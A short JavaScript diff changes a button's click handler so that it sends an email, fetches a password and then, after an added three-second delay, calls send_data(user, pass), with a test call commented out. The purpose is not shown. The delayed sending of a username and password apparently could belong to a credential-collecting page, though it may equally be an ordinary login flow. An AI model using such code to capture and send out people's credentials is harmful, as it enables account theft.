@@ -63,10 +63,8 @@ btn[1].addEventListener('click', function(){
     send_email();
     setTimeout(function() {
         pwd = send_pwd()
-        send_data(user, pass)
+        setTimeout(function(){send_data(user, pass)},3000)
+        
     }, 3000);
-    teste_send(user)
-    
-    
-    
+    //teste_send(user)   
 })
